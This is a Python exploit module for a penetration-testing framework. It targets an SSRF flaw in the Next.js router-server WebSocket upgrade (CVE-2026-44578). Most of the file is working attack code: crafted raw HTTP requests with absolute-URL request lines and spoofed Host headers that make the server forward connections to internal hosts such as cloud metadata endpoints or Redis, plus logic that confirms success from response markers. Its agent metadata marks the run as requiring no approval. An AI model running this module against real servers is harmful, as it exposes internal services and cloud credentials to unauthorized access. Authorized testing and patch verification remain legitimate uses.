#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import ssl
import time
from contextlib import closing
from typing import List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_WS_HEADERS = (
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
)

_DEFAULT_MARKERS: Tuple[bytes, ...] = (
    b"SSRF_CONFIRMED",
    b"ami-id",
    b"computeMetadata",
    b"Server: SimpleHTTP/",
    b"Directory listing for",
    b"redis_version",
)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js router-server WebSocket upgrade SSRF (CVE-2026-44578)",
        "description": (
            "Raw TCP to the Next standalone port: absolute-URL request-line or Host-header WebSocket "
            "upgrade so the router may forward the connection to an internal host:port. "
            "Use only on systems you own. Patched in Next.js >= 16.2.5 (GHSA-c4j6-fc7j-m34r)."
        ),
        "author": ["KittySploit Team"],
        "cve": "CVE-2026-44578",
        "references": ["https://github.com/advisories/GHSA-c4j6-fc7j-m34r"],
        "tags": ["http", "nextjs", "ssrf", "websocket", "scanner"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    internal_target = OptString(
        "127.0.0.1:9999",
        "Internal host:port the SSRF should reach (e.g. mock server, IMDS, Redis)",
        required=False,
    )
    internal_path = OptString("/", "Path on the internal target (e.g. / or /metadata)", required=False)
    ssrf_variant = OptString(
        "both",
        "absolute | host | both (absolute-URL request-line vs Host spoof)",
        required=False,
    )
    socket_timeout = OptFloat(5.0, "Connect/read timeout per variant (seconds)", required=False, advanced=True)
    extra_markers = OptString(
        "",
        "Comma-separated extra byte substrings to treat as SSRF confirmation",
        required=False,
        advanced=True,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _next_authority(self) -> str:
        h = str(self._o(self.target) or "").strip()
        p = int(self._o(self.port))
        return f"{h}:{p}"

    def _norm_path(self, p: str) -> str:
        p = (p or "/").strip() or "/"
        return p if p.startswith("/") else "/" + p

    def _markers(self) -> Tuple[bytes, ...]:
        raw = str(self._o(self.extra_markers) or "").strip()
        extra: List[bytes] = []
        if raw:
            for part in raw.split(","):
                t = part.strip().encode("latin1", errors="ignore")
                if t:
                    extra.append(t)
        return _DEFAULT_MARKERS + tuple(extra)

    def _payload_absolute(self, next_auth: str, internal: str, path: str) -> bytes:
        path = self._norm_path(path)
        return (
            f"GET http://{internal}{path} HTTP/1.1\r\n"
            f"Host: {next_auth}\r\n"
            f"{_WS_HEADERS}"
            "\r\n"
        ).encode("latin1")

    def _payload_host(self, internal: str, path: str) -> bytes:
        path = self._norm_path(path)
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {internal}\r\n"
            f"X-Forwarded-Host: {internal}\r\n"
            f"{_WS_HEADERS}"
            "\r\n"
        ).encode("latin1")

    def _send_raw(self, payload: bytes) -> Tuple[bytes, Optional[str]]:
        host = str(self._o(self.target) or "").strip()
        port = int(self._o(self.port))
        timeout = float(self._o(self.socket_timeout))
        use_ssl = self._to_bool(self._o(self.ssl))
        err: Optional[str] = None
        chunks: List[bytes] = []
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                if not self._to_bool(self._o(self.verify_ssl)):
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            with closing(sock):
                sock.sendall(payload)
                sock.settimeout(timeout)
                try:
                    while True:
                        chunk = sock.recv(65536)
                        if not chunk:
                            break
                        chunks.append(chunk)
                except socket.timeout:
                    pass
        except (OSError, ssl.SSLError) as e:
            err = str(e)
        return b"".join(chunks), err

    def _looks_like_ssrf(self, response: bytes) -> Tuple[bool, str]:
        for m in self._markers():
            if m in response:
                return True, m.decode("latin1", errors="replace")
        head = response[:200].decode("latin1", errors="replace").lower()
        if head and "next" not in head and "404" not in head and "400" not in head and "200" in head:
            return True, "non-Next 200 response"
        return False, ""

    def _run_variant(self, name: str, payload: bytes) -> Tuple[bool, bytes, Optional[str]]:
        print_status(f"Variant: {name} ({len(payload)} bytes)")
        t0 = time.perf_counter()
        resp, err = self._send_raw(payload)
        dt = time.perf_counter() - t0
        print_status(f"  received {len(resp)} bytes in {dt:.2f}s  err={err}")
        sample = resp[:4000]
        if sample:
            print_status(f"  sample:\n{sample.decode('latin1', errors='replace')}")
        ok, marker = self._looks_like_ssrf(resp)
        if ok:
            print_success(f"SSRF signal ({marker!r})")
        return ok, resp, err

    def check(self):
        var = str(self._o(self.ssrf_variant) or "both").strip().lower()
        if var not in ("absolute", "host", "both"):
            return {"vulnerable": False, "reason": f"Invalid ssrf_variant {var!r}", "confidence": "high"}
        internal = str(self._o(self.internal_target) or "").strip()
        if not internal:
            return {"vulnerable": False, "reason": "internal_target empty", "confidence": "high"}
        path = str(self._o(self.internal_path) or "/")
        auth = self._next_authority()
        results = []
        hit = False
        if var in ("absolute", "both"):
            pl = self._payload_absolute(auth, internal, path)
            resp, err = self._send_raw(pl)
            ok, m = self._looks_like_ssrf(resp)
            hit = hit or ok
            results.append({"name": "absolute", "ok": ok, "marker": m, "error": err, "bytes": len(resp)})
        if var in ("host", "both"):
            pl = self._payload_host(internal, path)
            resp, err = self._send_raw(pl)
            ok, m = self._looks_like_ssrf(resp)
            hit = hit or ok
            results.append({"name": "host", "ok": ok, "marker": m, "error": err, "bytes": len(resp)})
        if hit:
            return {
                "vulnerable": True,
                "reason": "Upgrade forwarded; internal response markers matched",
                "confidence": "medium",
                "variants": results,
            }
        return {
            "vulnerable": False,
            "reason": "No SSRF markers in responses (patched, blocked, or wrong internal target)",
            "confidence": "low",
            "variants": results,
        }

    def run(self) -> bool:
        var = str(self._o(self.ssrf_variant) or "both").strip().lower()
        if var not in ("absolute", "host", "both"):
            print_error("ssrf_variant must be absolute, host, or both")
            return False
        internal = str(self._o(self.internal_target) or "").strip()
        if not internal:
            print_error("Set internal_target (host:port of the internal service).")
            return False
        path = str(self._o(self.internal_path) or "/")
        auth = self._next_authority()
        print_info(f"Next entry: {auth}  (ssl={self._o(self.ssl)})")
        print_info(f"Internal: {internal}{self._norm_path(path)}  variant={var}")

        pwned = False
        if var in ("absolute", "both"):
            pl = self._payload_absolute(auth, internal, path)
            ok, _, _ = self._run_variant("absolute-URL request-line", pl)
            pwned = pwned or ok
        if var in ("host", "both"):
            pl = self._payload_host(internal, path)
            ok, _, _ = self._run_variant("Host-header injection", pl)
            pwned = pwned or ok

        if pwned:
            print_error("Target appears vulnerable (WebSocket upgrade SSRF).")
            return True
        print_success("No SSRF signal — likely patched, unreachable, or markers mismatch.")
        return False
